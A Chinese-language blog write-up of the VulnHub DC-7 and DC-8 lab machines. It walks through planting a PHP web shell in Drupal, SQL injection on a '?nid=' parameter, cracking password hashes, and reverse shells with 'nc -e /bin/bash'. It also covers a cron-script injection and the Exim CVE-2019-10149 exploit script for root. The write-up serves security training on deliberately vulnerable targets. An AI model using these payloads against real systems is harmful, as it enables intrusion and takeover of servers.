<h3 id="添加php执行插件"><a href="#添加php执行插件" class="headerlink" title="添加php执行插件"></a>添加php执行插件</h3><p><code>drupal</code>框架可以添加<code>php</code>文件插件，从而能修改为<code>php</code>文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018220115382.png"><img src="/vulnhub/image-20221018220115382.png" alt="image-20221018220115382"></a></p>
<p>点击</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">install <span class="keyword">new</span> <span class="keyword">module</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018220912473.png"><img src="/vulnhub/image-20221018220912473.png" alt="image-20221018220912473"></a></p>
<p>在<code>url</code>里填写</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">https</span>://<span class="keyword">ftp</span>.drupal.org/<span class="built_in">files</span>/projects/php<span class="number">-8.</span>x<span class="number">-1.</span>x-dev.tar.gz</span><br></pre></td></tr></table></figure>

<p>然后<code>install</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018221952909.png"><img src="/vulnhub/image-20221018221952909.png" alt="image-20221018221952909"></a></p>
<p>但是我这里显示无法连接网站，那我们直接上传插件文件也是可以的</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018222047051.png"><img src="/vulnhub/image-20221018222047051.png" alt="image-20221018222047051"></a></p>
<p>然后添加成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018222109470.png"><img src="/vulnhub/image-20221018222109470.png" alt="image-20221018222109470"></a></p>
<p>然后在<code>FILTERS</code>处</p>
<p>启动插件【勾选】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018222451086.png"><img src="/vulnhub/image-20221018222451086.png" alt="image-20221018222451086"></a></p>
<p>最后记得还要<code>install</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018222512620.png"><img src="/vulnhub/image-20221018222512620.png" alt="image-20221018222512620"></a></p>
<p>然后我们的文件就可以以<code>php</code>文件形式执行了</p>
<h3 id="加入一句话木马"><a href="#加入一句话木马" class="headerlink" title="加入一句话木马"></a>加入一句话木马</h3><p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018232816262.png"><img src="/vulnhub/image-20221018232816262.png" alt="image-20221018232816262"></a></p>
<p>【记住<code>Text foromat</code>要改成<code>PHP code</code>】</p>
<p>然后保存即可</p>
<h2 id="5-蚁剑连接getshell"><a href="#5-蚁剑连接getshell" class="headerlink" title="5.蚁剑连接getshell"></a>5.蚁剑连接getshell</h2><p>因为我们是在<code>welcome</code>页面里插入一句话木马，所以直接连接靶机ip就行</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.146</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018232842168.png"><img src="/vulnhub/image-20221018232842168.png" alt="image-20221018232842168"></a></p>
<p>连接成功</p>
<p>启动虚拟终端</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018232923762.png"><img src="/vulnhub/image-20221018232923762.png" alt="image-20221018232923762"></a></p>
<p><code>getshell</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018233020910.png"><img src="/vulnhub/image-20221018233020910.png" alt="image-20221018233020910"></a></p>
<h2 id="6-反弹shell拿www-data"><a href="#6-反弹shell拿www-data" class="headerlink" title="6.反弹shell拿www-data"></a>6.反弹shell拿www-data</h2><p>我们先开始监听<code>9999</code>端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018233321886.png"><img src="/vulnhub/image-20221018233321886.png" alt="image-20221018233321886"></a></p>
<p>我们在蚁剑的<code>shell</code>上</p>
<p>开始反弹<code>shell</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">192.168.133.140</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018233814670.png"><img src="/vulnhub/image-20221018233814670.png" alt="image-20221018233814670"></a></p>
<p>然后拿到反弹<code>shell</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018233713840.png"><img src="/vulnhub/image-20221018233713840.png" alt="image-20221018233713840"></a></p>
<p>进入交互式shell</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018234804275.png"><img src="/vulnhub/image-20221018234804275.png" alt="image-20221018234804275"></a></p>
<h2 id="7-利用定时任务【cron】提权root"><a href="#7-利用定时任务【cron】提权root" class="headerlink" title="7.利用定时任务【cron】提权root"></a>7.利用定时任务【cron】提权<code>root</code></h2><p>我们向 <code>backups.sh</code>写入反弹<code>shell</code>命令</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nc 192.168.133.140 12345 -e /bin/bash&quot;</span> &gt;&gt; /<span class="keyword">opt</span>/scripts/backups.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018235007598.png"><img src="/vulnhub/image-20221018235007598.png" alt="image-20221018235007598"></a></p>
<p>然后我们再开一个控制台开始监听<code>12345</code>端口</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221018235124023.png"><img src="/vulnhub/image-20221018235124023.png" alt="image-20221018235124023"></a></p>
<p>然后我们等待定时任务执行，便可以拿到<code>shell</code>【时间有点久】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221019000112748.png"><img src="/vulnhub/image-20221019000112748.png" alt="image-20221019000112748"></a></p>
<p>连接成功后，到<code>root</code>目录查看<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221019123852041.png"><img src="/vulnhub/image-20221019123852041.png" alt="image-20221019123852041"></a></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure>


<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p>
<p><code>I&#39;m sending out an especially big thanks to:</code></p>
<p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是：<br>恭喜！！！</p>
<p>希望你喜欢 DC-7。只是想向所有这些人表示衷心的感谢<br>提供反馈的人，以及所有花时间完成这些小事的人<br>挑战。</p>
<p>我要特别感谢：</p>
<p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@心42</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<h1 id="八、DC8-初级"><a href="#八、DC8-初级" class="headerlink" title="八、DC8[初级]"></a>八、DC8[初级]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p><code>hint:</code><br><code>This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.</code></p>
<p><code>The &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.</code></p>
<p><code>The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.</code></p>
<p><code>You probably wouldn&#39;t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it&#39;s definitely there and doing it&#39;s job.</code></p>
<p>意思是：<br>这个挑战有点混合实际挑战和“概念证明”，即在 Linux 上安装和配置的双因素身份验证是否可以防止 Linux 服务器被利用。</p>
<p>这个挑战的“概念证明”部分最终是由于 Twitter 上关于双因素身份验证和 Linux 的问题，以及@theart42 的建议。</p>
<p>此挑战的最终目标是绕过双重身份验证，获取 root 权限并读取唯一标志。</p>
<p>除非您尝试通过 SSH 登录，否则您可能甚至不知道已安装和配置了双因素身份验证，但它肯定存在并且可以正常工作。</p>
</blockquote>
<h2 id="信息收集-7"><a href="#信息收集-7" class="headerlink" title="信息收集"></a>信息收集</h2><p> 先<code>nmap</code>扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221102234939357.png"><img src="/vulnhub/image-20221102234939357.png" alt="image-20221102234939357"></a></p>
<blockquote>
<p>发现<br><code>22</code>端口<br>运行着<code>ssh</code></p>
<p>80端口下<br>发现有个<code>include</code>页面，可能需要在这里上传木马拿shell<br>然后有<code>install.mysql.txt</code>，看来可能需要用到数据库</p>
</blockquote>
<p>再<code>dirsearch</code>扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221102235306844.png"><img src="/vulnhub/image-20221102235306844.png" alt="image-20221102235306844"></a></p>
<blockquote>
<p>发现有<code>/user/login</code>页面，猜测是登录后台的页面<br>后面找找有没有账号密码信息</p>
</blockquote>
<p>再看看<code>wapplzer</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103112318956.png"><img src="/vulnhub/image-20221103112318956.png" alt="image-20221103112318956"></a></p>
<h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>然后分析网站页面</p>
<p>发现在<code>details</code>时，<code>url</code>出现</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.147</span>/?nid=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103112255720.png"><img src="/vulnhub/image-20221103112255720.png" alt="image-20221103112255720"></a></p>
<p>看到注入处，再结合之前的<code>nmap</code>扫描的结果，有<code>mysql</code>安装，猜测可能存在<code>sql</code>注入</p>
<p>试试<code>sql</code>注入有没有反应</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.147</span>/?nid=-<span class="number">1</span> union select schema_name from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103130411912.png"><img src="/vulnhub/image-20221103130411912.png" alt="image-20221103130411912"></a></p>
<p>看来确实是存在<code>sql</code>注入</p>
<p>手动注不难，完全没有过滤，但还是用<code>sqlmap</code>直接梭哈</p>
<p>数据库知道了</p>
<p>先看看表</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103131256965.png"><img src="/vulnhub/image-20221103131256965.png" alt="image-20221103131256965"></a></p>
<p>看到有个<code>users</code>列，查看有没有我们需要的后台登录的账号密码</p>
<p>发现有两个用户</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103131824229.png"><img src="/vulnhub/image-20221103131824229.png" alt="image-20221103131824229"></a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">admin <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span></span><br><span class="line">john <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span><span class="regexp">/3if/</span>oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure>

<p>但是密码是加密的，我们用<code>john</code>爆破一下</p>
<p>先把密码写入密码文本<code>pass.txt</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103133656691.png"><img src="/vulnhub/image-20221103133656691.png" alt="image-20221103133656691"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103133745514.png"><img src="/vulnhub/image-20221103133745514.png" alt="image-20221103133745514"></a></p>
<p>然后就用<code>john</code>自带的密码本就行</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">john <span class="keyword">pass</span>.txt</span><br></pre></td></tr></table></figure>

<p>但是再这里我用了<code>johny</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103134419589.png"><img src="/vulnhub/image-20221103134419589.png" alt="image-20221103134419589"></a></p>
<p>一个图形化的爆破工具</p>
<p>这里只得到<code>john</code>用户的密码</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">turtle</span></span><br></pre></td></tr></table></figure>

<h2 id="2-后台添加木马"><a href="#2-后台添加木马" class="headerlink" title="2.后台添加木马"></a>2.后台添加木马</h2><p>拿到账号密码后，我们到后台登录页面进行登录</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.147</span><span class="regexp">/user/</span>login</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103134815814.png"><img src="/vulnhub/image-20221103134815814.png" alt="image-20221103134815814"></a></p>
<p>登录成功，根据之前我们信息收集，在<code>nmap</code>得到的信息，我们需要找到上传木马或者修改文件内容的地方</p>
<p>在右上角我们看到有个<code>content</code></p>
<p>打开看看里面是不是可以修改</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103135017243.png"><img src="/vulnhub/image-20221103135017243.png" alt="image-20221103135017243"></a></p>
<p>结果发现<code>Contact Us</code>页面文件可以进行修改</p>
<p>打开看看，发现在<code>edit</code>没有修改的地方</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103142531482.png"><img src="/vulnhub/image-20221103142531482.png" alt="image-20221103142531482"></a></p>
<p>于是找了找网站源码在</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103143057684.png"><img src="/vulnhub/image-20221103143057684.png" alt="image-20221103143057684"></a></p>
<p>这里可以修改，于是我们就修改一下</p>
<p>并记得把编码文件格式改为<code>PHP code</code></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Thanks for taking the time to contact us. We shall be in contact soon.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nc -e /bin/sh 192.168.133.140 8888&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103143148817.png"><img src="/vulnhub/image-20221103143148817.png" alt="image-20221103143148817"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103144244656.png"><img src="/vulnhub/image-20221103144244656.png" alt="image-20221103144244656"></a>然后底下保存</p>
<h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><p>然后我们开始监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103145521745.png"><img src="/vulnhub/image-20221103145521745.png" alt="image-20221103145521745"></a></p>
<p>访问<code>Contact Us</code>页面发送信息，从而触发php执行命令</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103145747096.png"><img src="/vulnhub/image-20221103145747096.png" alt="image-20221103145747096"></a></p>
<p>拿到<code>shell</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103145811789.png"><img src="/vulnhub/image-20221103145811789.png" alt="image-20221103145811789"></a></p>
<h2 id="4-提权【exim4】"><a href="#4-提权【exim4】" class="headerlink" title="4.提权【exim4】"></a>4.提权【exim4】</h2><p>先进入交互式<code>shell</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103145952120.png"><img src="/vulnhub/image-20221103145952120.png" alt="image-20221103145952120"></a></p>
<p>先查看一下<code>suid</code>命令</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103150054750.png"><img src="/vulnhub/image-20221103150054750.png" alt="image-20221103150054750"></a></p>
<p>找到了个新的命令<code>exim4</code>，搜了一下</p>
<blockquote>
<p><code>exim4</code></p>
<p><code>exim</code>远程命令执行漏洞分析（<code>cve-2019-10149</code>）</p>
<p>在对Exim邮件服务器最新改动进行代码审计过程中，我们发现4.87到4.91版本之间的Exim存在一个远程命令执行（RCE）漏洞。这里RCE指的是远程命令执行（Remote Command Execution），而不是远程代码执行（Remote Code Execution）：<code>攻击者可以以root权限使用execv()来执行任意命令，利用过程中不涉及到内存破坏或者ROP（Return-Oriented Programming）相关内容。</code></p>
<p>这个漏洞可以由本地攻击者直接利用（远程攻击者需要在特定的非默认配置下利用）。为了在默认配置下远程利用该漏洞，攻击者需要与存在漏洞的服务器建连7天（可以每隔几分钟发送1个字节）。然而由于Exim的代码非常复杂，我们无法保证这里介绍的方法是唯一的利用方法，可能还存在其他更加快捷的方法。</p>
<p>从4.87版开始（2016年4月6日公布），由于#ifdef EXPERIMENTAL_EVENT改成了#ifndef DISABLE_EVENT，因此Exim默认情况下就存在漏洞。在之前的版本中，如果手动启用了EXPERIMENTAL_EVENT选项，那么服务器也会存在漏洞。令人惊讶的是，这个漏洞已经在4.92版中被修复（2019年2月10日）：</p>
</blockquote>
<p>根据文档，发现是个和邮件服务有关的命令，并且存在命令执行漏洞</p>
<p>我们先查看一下其版本是否在这个<code>nday</code>的范围里</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103150517673.png"><img src="/vulnhub/image-20221103150517673.png" alt="image-20221103150517673"></a></p>
<p>发现刚好是这个版本范围，是存在<code>RCE</code></p>
<p>查看一下有没有利用的脚本</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103151738985.png"><img src="/vulnhub/image-20221103151738985.png" alt="image-20221103151738985"></a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Privilege：特权</span><br></pre></td></tr></table></figure>

<p>选择<code>46996.sh</code>，我们查看一下脚本文件内容</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">searchsploit <span class="number">46996</span> -p  </span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local/<span class="number">46996</span>.sh</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103151838092.png"><img src="/vulnhub/image-20221103151838092.png" alt="image-20221103151838092"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103152003846.png"><img src="/vulnhub/image-20221103152003846.png" alt="image-20221103152003846"></a></p>
<p>发现有两个使用方法，一个<code>setuid</code>，一个<code>netcat</code></p>
<p>主要是上传到靶机<code>shell</code>后，执行命令不同</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br><span class="line">或</span><br><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure>





<p>我们先把脚本文件复制下来</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103152351530.png"><img src="/vulnhub/image-20221103152351530.png" alt="image-20221103152351530"></a></p>
<p>再上传到靶机<code>shell</code></p>
<p><code>kali</code>主机执行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">9999</span> &lt; raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103152714451.png"><img src="/vulnhub/image-20221103152714451.png" alt="image-20221103152714451"></a></p>
<p>靶机<code>shell</code>中执行</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> <span class="number">192.168.133.140</span> <span class="number">9999</span> &gt; raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103153550325.png"><img src="/vulnhub/image-20221103153550325.png" alt="image-20221103153550325"></a></p>
<p>发现权限不够，看来是不能在这个页面新建文件</p>
<p>我们到<code>/tmp</code>目录下一般可以</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103153658085.png"><img src="/vulnhub/image-20221103153658085.png" alt="image-20221103153658085"></a></p>
<p>下载成功</p>
<p>执行提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103153740349.png"><img src="/vulnhub/image-20221103153740349.png" alt="image-20221103153740349"></a></p>
<p>发现无执行权限，我们修改一下</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">777</span> raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103153901179.png"><img src="/vulnhub/image-20221103153901179.png" alt="image-20221103153901179"></a></p>
<p>成功执行脚本</p>
<hr>
<h3 id="意外"><a href="#意外" class="headerlink" title="意外"></a>意外</h3><p>但结果发现还是</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103154130346.png"><img src="/vulnhub/image-20221103154130346.png" alt="image-20221103154130346"></a></p>
<p>低权限账号</p>
<p>于是我们再执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure>

<p>结果还是一样</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103155324498.png"><img src="/vulnhub/image-20221103155324498.png" alt="image-20221103155324498"></a></p>
<p>而且提醒在靶机的<code>31337</code>端口连接关闭了</p>
<p>看了看其他大佬的<code>wp</code></p>
<p>发现有一步【其实是没必要的】</p>
<blockquote>
<p>在脚本文件里执行<br>说是因为这个脚本是<code>windows</code>底下编写的，所以需要修改一下，改成<code>Linux</code><br><code>set ff=unix</code></p>
</blockquote>
<p>结果还是一样，看来是靶机有问题了，猜测是靶机和<code>kali</code>主机之间连接有问题，我换手机热点试试</p>
<hr>
<p>成功【校园网真垃圾】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103160625006.png"><img src="/vulnhub/image-20221103160625006.png" alt="image-20221103160625006"></a></p>
<p>到根目录查看<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103160824407.png"><img src="/vulnhub/image-20221103160824407.png" alt="image-20221103160824407"></a></p>
<p>得到<code>flag</code></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;</span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br></pre></td></tr></table></figure>

<p><code>Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p>
<p><code>I&#39;m also sending out an especially big thanks to:</code></p>
<p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p>
<p><code>This challenge was largely based on two things:</code></p>
<ol>
<li><code>A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</code></li>
<li><code>A suggestion from @theart42</code></li>
</ol>
<p><code>The answer to that question is...</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>意思是：<br>希望你喜欢 DC-8。只是想向所有这些人表示衷心的感谢<br>提供反馈的人，以及所有花时间完成这些小事的人<br>挑战。</p>
<p>我还要特别感谢：</p>
<p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@心42</p>
<p>这一挑战主要基于两件事：</p>
<ol>
<li>我从有人询问关于 Linux 机器上的 2FA 以及它是否值得的一条推文。</li>
<li>来自@theart42 的建议</li>
</ol>
<p>这个问题的答案是……</p>
<p>如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</p>
</blockquote>
<p>【注意，这个提权不稳定，所以需要快点拿取<code>flag</code>，或者按我之前写的方法进入稳定<code>shell</code>】</p>
<hr>
<h3 id="p-s-setuid"><a href="#p-s-setuid" class="headerlink" title="p.s. setuid"></a>p.s. setuid</h3><p>我再试试另外一个命令试试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103161221325.png"><img src="/vulnhub/image-20221103161221325.png" alt="image-20221103161221325"></a></p>
<p>发现还是一样</p>
<p>查了一下</p>
<blockquote>
<p><code>setuid</code></p>
<p><code>setuid</code>是类unix系统提供的一个标志位， 其实际意义是set一个process的euid为这个可执行文件或程序的拥有者(比如root)的uid， 也就是说当setuid位被设置之后， 当文件或程序(统称为executable)被执行时, 操作系统会赋予文件所有者的权限, 因为其euid是文件所有者的uid.</p>
</blockquote>
<p>而且我们执行完发现生成了两个<code>pwn</code>文件【狂喜，最近正好在学习<code>pwn</code>】</p>
<p>查了一下<code>setuid</code>在<code>pwn</code>中的利用</p>
<h4 id="在pwn中"><a href="#在pwn中" class="headerlink" title="在pwn中"></a>在pwn中</h4><p><code>什么是setuid？</code></p>
<blockquote>
<p><code>setuid</code>代表设置用户身份，并且<code>setuid</code>设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配</p>
</blockquote>
<p>这么说起来有点绕，我们来举一个例子</p>
<blockquote>
<p>一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了</p>
</blockquote>
<p>演示<br>我们用<code>user</code>用户运行一个<code>vim</code><br>然后新开一个窗口查看后台进程</p>
